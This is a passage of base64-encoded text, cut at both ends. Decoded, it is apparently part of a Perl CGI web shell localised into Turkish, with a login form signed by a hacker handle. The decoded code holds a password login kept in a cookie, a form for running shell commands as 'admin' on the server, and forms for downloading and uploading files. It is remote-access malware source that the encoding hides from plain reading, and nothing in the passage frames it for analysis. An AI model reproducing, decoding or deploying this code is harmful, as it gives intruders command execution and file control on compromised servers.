tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIExvZ2luIFNjcmVlbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9naW5TY3JlZW4NCnsNCglwcmludCA8PEVORDsNCjxwcmU+PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KVHlwaW5nVGV4dCA9IGZ1bmN0aW9uKGVsZW1lbnQsIGludGVydmFsLCBjdXJzb3IsIGZpbmlzaGVkQ2FsbGJhY2spIHsNCiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsNCiAgICB0aGlzLnJ1bm5pbmcgPSB0cnVlOwkvLyBOZXZlciBydW4uDQogICAgcmV0dXJuOw0KICB9DQogIHRoaXMuZWxlbWVudCA9IGVsZW1lbnQ7DQogIHRoaXMuZmluaXNoZWRDYWxsYmFjayA9IChmaW5pc2hlZENhbGxiYWNrID8gZmluaXNoZWRDYWxsYmFjayA6IGZ1bmN0aW9uKCkgeyByZXR1cm47IH0pOw0KICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsNCiAgdGhpcy5vcmlnVGV4dCA9IHRoaXMuZWxlbWVudC5pbm5lckhUTUw7DQogIHRoaXMudW5wYXJzZWRPcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQ7DQogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsNCiAgdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KICB0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgdGhpcy5lbGVtZW50LnR5cGluZ1RleHQgPSB0aGlzOw0KICBpZih0aGlzLmVsZW1lbnQuaWQgPT0gIiIpIHRoaXMuZWxlbWVudC5pZCA9ICJ0eXBpbmd0ZXh0IiArIFR5cGluZ1RleHQuY3VycmVudEluZGV4Kys7DQogIFR5cGluZ1RleHQuYWxsLnB1c2godGhpcyk7DQogIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICB0aGlzLmluVGFnID0gZmFsc2U7DQogIHRoaXMudGFnQnVmZmVyID0gIiI7DQogIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICIiOw0KfQ0KVHlwaW5nVGV4dC5hbGwgPSBuZXcgQXJyYXkoKTsNClR5cGluZ1RleHQuY3VycmVudEluZGV4ID0gMDsNClR5cGluZ1RleHQucnVuQWxsID0gZnVuY3Rpb24oKSB7DQogIGZvcih2YXIgaSA9IDA7IGkgPCBUeXBpbmdUZXh0LmFsbC5sZW5ndGg7IGkrKykgVHlwaW5nVGV4dC5hbGxbaV0ucnVuKCk7DQp9DQpUeXBpbmdUZXh0LnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbigpIHsNCiAgaWYodGhpcy5ydW5uaW5nKSByZXR1cm47DQogIGlmKHR5cGVvZiB0aGlzLm9yaWdUZXh0ID09ICJ1bmRlZmluZWQiKSB7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwkvLyBXZSBoYXZlbid0IGZpbmlzaGVkIGxvYWRpbmcgeWV0LiAgSGF2ZSBwYXRpZW5jZS4NCiAgICByZXR1cm47DQogIH0NCiAgaWYodGhpcy5jdXJyZW50VGV4dCA9PSAiIikgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9ICIiOw0KLy8gIHRoaXMub3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0LnJlcGxhY2UoLzwoW148XSkqPi8sICIiKTsgICAgIC8vIFN0cmlwIEhUTUwgZnJvbSB0ZXh0Lg0KICBpZih0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGgpIHsNCiAgICBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPCIgJiYgIXRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyID0gIjwiOw0KICAgICAgdGhpcy5pblRhZyA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPiIgJiYgdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gIj4iOw0KICAgICAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLnRhZ0J1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIiYiICYmICF0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiYiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjsiICYmIHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gIjsiOw0KICAgICAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5IVE1MRW50aXR5QnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIHsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgfQ0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSB0aGlzLmN1cnJlbnRUZXh0Ow0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgKz0gKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCAtIDEgPyAodHlwZW9mIHRoaXMuY3Vyc29yID09ICJmdW5jdGlvbiIgPyB0aGlzLmN1cnNvcih0aGlzLmN1cnJlbnRUZXh0KSA6IHRoaXMuY3Vyc29yKSA6ICIiKTsNCiAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOw0KICB9IGVsc2Ugew0KCXRoaXMuY3VycmVudFRleHQgPSAiIjsNCgl0aGlzLmN1cnJlbnRDaGFyID0gMDsNCiAgICAgICAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogICAgICAgIHRoaXMuZmluaXNoZWRDYWxsYmFjaygpOw0KICB9DQp9DQo8L3NjcmlwdD4NCjwvcHJlPg0KDQo8YnI+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDMwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOw0KVHlwaW5nVGV4dC5ydW5BbGwoKTsNCg0KPC9zY3JpcHQ+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgZW5jb2RlIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFVybEVuY29kZSgkKXsNCglteSAkc3RyID0gc2hpZnQ7DQoJJHN0ciA9fiBzLyhbXkEtWmEtejAtOV0pL3NwcmludGYoIiUlJTAyWCIsIG9yZCgkMSkpL3NlZzsNCglyZXR1cm4gJHN0cjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLycvZzsNCgkkdGV4dCA9fiBzLzwvJmx0Oy9nOw0KCSR0ZXh0ID1+IHMvPi8mZ3Q7L2c7DQoJcmV0dXJuICR0ZXh0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgbGluayBmb3IgZGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQWRkTGlua0RpcigkKQ0Kew0KCW15ICRhYz1zaGlmdDsNCglteSBAZGlyPSgpOw0KCWlmKCRXaW5OVCkNCgl7DQoJCUBkaXI9c3BsaXQoL1xcLywkQ3VycmVudERpcik7DQoJfWVsc2UNCgl7DQoJCUBkaXI9c3BsaXQoIi8iLCZ0cmltKCRDdXJyZW50RGlyKSk7DQoJfQ0KCW15ICRwYXRoPSIiOw0KCW15ICRyZXN1bHQ9IiI7DQoJZm9yZWFjaCAoQGRpcikNCgl7DQoJCSRwYXRoIC49ICRfLiRQYXRoU2VwOw0KCQkkcmVzdWx0Lj0iPGEgaHJlZj0nP2E9Ii4kYWMuIiZkPSIuZW5jb2RlX2Jhc2U2NCgkcGF0aCkuIic+Ii4kXy4kUGF0aFNlcC4iPC9hPiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIG1lc3NhZ2UgdGhhdCBpbmZvcm1zIHRoZSB1c2VyIG9mIGEgZmFpbGVkIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2UNCnsNCglwcmludCA8PEVORDsNCg0KU2lmcmU6PGJyPg0KQmlyIFllcmRlIFlhbmxpc2xpayBWYXI8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KS3VsbGFuaWNpIEFkaSA6IEhhY2tlciBBdjNMb1hpUzxicj4NClNpZnJlOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR2lyaXMiPg0KPC9mb3JtPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgZm9vdGVyIGZvciB0aGUgSFRNTCBQYWdlDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRQYWdlRm9vdGVyDQp7DQoJcHJpbnQgIjxicj48Zm9udCBjb2xvcj1yZWQ+by0tLVsgIDxmb250IGNvbG9yPSNmZjk5MDA+RWRpdCBieSAkRWRpdFBlcnNpb24gPC9mb250PiAgXS0tLW88L2ZvbnQ+PC9jb2RlPjwvY2VudGVyPjwvYm9keT48L2h0bWw+IjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmV0cmVpdmVzIHRoZSB2YWx1ZXMgb2YgYWxsIGNvb2tpZXMuIFRoZSBjb29raWVzIGNhbiBiZSBhY2Nlc3NlcyB1c2luZyB0aGUNCiMgdmFyaWFibGUgJENvb2tpZXN7Jyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIHNjcmVlbiB3aGVuIHRoZSB1c2VyIGxvZ3Mgb3V0DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dvdXRTY3JlZW4NCnsNCglwcmludCAiQmFnbGFudGkgU29ubGFuZGlyaWxkaS48YnI+PGJyPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCglwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9O1xuIjsgIyByZW1vdmUgcGFzc3dvcmQgY29va2llDQoJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCSZQcmludExvZ291dFNjcmVlbjsNCg0KCSZQcmludExvZ2luU2NyZWVuOw0KCSZQcmludExvZ2luRm9ybTsNCgkmUHJpbnRQYWdlRm9vdGVyOw0KCWV4aXQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gbG9naW4gdGhlIHVzZXIuIElmIHRoZSBwYXNzd29yZCBtYXRjaGVzLCBpdA0KIyBkaXNwbGF5cyBhIHBhZ2UgdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gcnVuIGNvbW1hbmRzLiBJZiB0aGUgcGFzc3dvcmQgZG9lbnMndA0KIyBtYXRjaCBvciBpZiBubyBwYXNzd29yZCBpcyBlbnRlcmVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9naW4gDQp7DQoJaWYoJExvZ2luUGFzc3dvcmQgZXEgJFBhc3N3b3JkKSAjIHBhc3N3b3JkIG1hdGNoZWQNCgl7DQoJCXByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD0kTG9naW5QYXNzd29yZDtcbiI7DQoJCSZQcmludFBhZ2VIZWFkZXI7DQoJCXByaW50ICZMaXN0RGlyOw0KCX0NCgllbHNlICMgcGFzc3dvcmQgZGlkbid0IG1hdGNoDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJwIik7DQoJCSZQcmludExvZ2luU2NyZWVuOw0KCQlpZigkTG9naW5QYXNzd29yZCBuZSAiIikgIyBzb21lIHBhc3N3b3JkIHdhcyBlbnRlcmVkDQoJCXsNCgkJCSZQcmludExvZ2luRmFpbGVkTWVzc2FnZTsNCg0KCQl9DQoJCSZQcmludExvZ2luRm9ybTsNCgkJJlByaW50UGFnZUZvb3RlcjsNCgkJZXhpdDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkZGlyPSAiPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJjb21tYW5kIikuIjwvc3Bhbj4iOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCglyZXR1cm4gPDxFTkQ7DQo8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIiBvblN1Ym1pdD0iRW5jb2RlcignYycpIj4NCg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KJFByb21wdA0KPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIiBpZD0iYyI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmFzIFBhbnBhIj4NCjwvZm9ybT4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgZm9ybSB0aGF0IGFsbG93cyB0aGUgdXNlciB0byBkb3dubG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZURvd25sb2FkRm9ybQ0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEVuY29kZUN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRG9zeWEgSXNtaTogPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImYiIHNpemU9IjM1Ij48YnI+PGJyPg0KSW5kaXI6IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJJbmRpciBQYW5wYSI+DQoNCjwvZm9ybT4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHVwbG9hZCBmaWxlcw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RmlsZVVwbG9hZEZvcm0NCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGRpcj0gJkFkZExpbmtEaXIoInVwbG9hZCIpOw0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQokUHJvbXB0IHVwbG9hZDxicj48YnI+DQpEb3N5YSBJc21pOiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpBeWFybGFyOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIGlkPSJ1cCIgdmFsdWU9Im92ZXJ3cml0ZSI+DQo8bGFiZWwgZm9yPSJ1cCI+QXluaSBEb3N5YSBWYXJzYSBVc3TDvG5lIFlhejwvbGFiZWw+PGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iWXVrbGUgUGFucGEiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdGltZW91dCBmb3IgYSBjb21tYW5kIGV4cGlyZXMuIFdlIG5lZWQgdG8NCiMgdGVybWluYXRlIHRoZSBzY3JpcHQgaW1tZWRpYXRlbHkuIFRoaXMgZnVuY3Rpb24gaXMgdmFsaWQgb25seSBvbiBVbml4LiBJdCBpcw0KIyBuZXZlciBjYWxsZWQgd2hlbiB0aGUgc2NyaXB0IGlzIHJ1bm5pbmcgb24gTlQuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQ29tbWFuZFRpbWVvdXQNCnsNCglpZighJFdpbk5UKQ0KCXsNCgkJYWxhcm0oMCk7DQoJCXJldHVybiA8PEVORDsNCjwvdGV4dGFyZWE+DQo8YnI+PGZvbnQgY29sb3I9eWVsbG93Pg0KQmVsaXJ0aWxlbiBNYXhpbXVtIFphbWFuaSBHZWN0aTogJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2FuaXllKGxlcikuPC9mb250Pg0KPGJyPjxmb250IHNpemU9JzYnIGNvbG9yPXJlZD5LaWxsITwvZm9udD4NCkVORA0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBkaXNwbGF5cyB0aGUgcGFnZSB0aGF0IGNvbnRhaW5zIGEgbGluayB3aGljaCBhbGxvd3MgdGhlIHVzZXINCiMgdG8gZG93bmxvYWQgdGhlIHNwZWNpZmllZCBmaWxlLiBUaGUgcGFnZSBhbHNvIGNvbnRhaW5zIGEgYXV0by1yZWZyZXNoDQojIGZlYXR1cmUgdGhhdCBzdGFydHMgdGhlIGRvd25sb2FkIGF1dG9tYXRpY2FsbHkuDQojIEFyZ3VtZW50IDE6IEZ1bGx5IHF1YWxpZmllZCBmaWxlbmFtZSBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t